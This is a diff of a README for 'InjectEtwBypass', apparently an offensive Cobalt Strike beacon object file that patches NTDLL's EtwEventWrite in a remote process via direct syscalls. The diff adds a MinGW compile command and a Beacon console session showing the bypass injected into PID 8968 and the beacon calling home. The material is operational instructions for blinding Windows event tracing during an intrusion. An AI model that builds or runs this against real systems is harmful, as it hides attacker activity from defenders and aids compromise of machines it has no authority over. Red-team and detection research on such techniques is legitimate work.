@@ -4,20 +4,24 @@ Inject ETW Bypass into Remote Process via Syscalls (HellsGate|HalosGate)
 #### Running InjectEtwBypass BOF from CobaltStrike to Bypass ETW in Notepad.exe
   ![](images/injectEtw.png)
 
-## Build (Only tested from macOS at the moment)
-1. Run the compile-x64.sh shell script after installling required dependencies
+### Compile with x64 MinGW:
 ```bash
-# Install brew on macOS if you need it (https://brew.sh/)
-/bin/bash -c "$(curl -fsSL https://raw.githubusercontent.com/Homebrew/install/HEAD/install.sh)"
-# Install Ming using Brew
-brew install mingw-w64
-# Clone this Reflective DLL project from this github repo
-git clone https://github.com/boku7/CobaltStrikeReflectiveLoader.git
-# Compile the ReflectiveLoader Object file
-cd CobaltStrikeReflectiveLoader/
 cat compile.sh
 x86_64-w64-mingw32-gcc -m64 -mwindows -c injectEtwBypass.c -o injectEtwBypass.o -masm=intel -Wall -fno-asynchronous-unwind-tables -nostdlib -fno-ident -Wl,-Tlinker.ld,--no-seh
 bash compile.sh
+```
+
+### Run from Cobalt Strike Beacon Console
+```bash
+beacon> help
+    injectEtwBypass           Inject ETW Bypass into Remote Process via Syscalls (HellsGate|HalosGate)
+beacon> help injectEtwBypass
+Synopsis: injectEtwBypass PID
+beacon> injectEtwBypass 8968
+[*] Inject ETW Bypass (Bobby Cooke//SpiderLabs|@0xBoku|github.com/boku7)
+[+] host called home, sent: 2336 bytes
+[+] received output:
+Injecting NTDLL.EtwEventWrite bypass in remote process: 8968 (PID)
 ```
 
 ## Credits / References
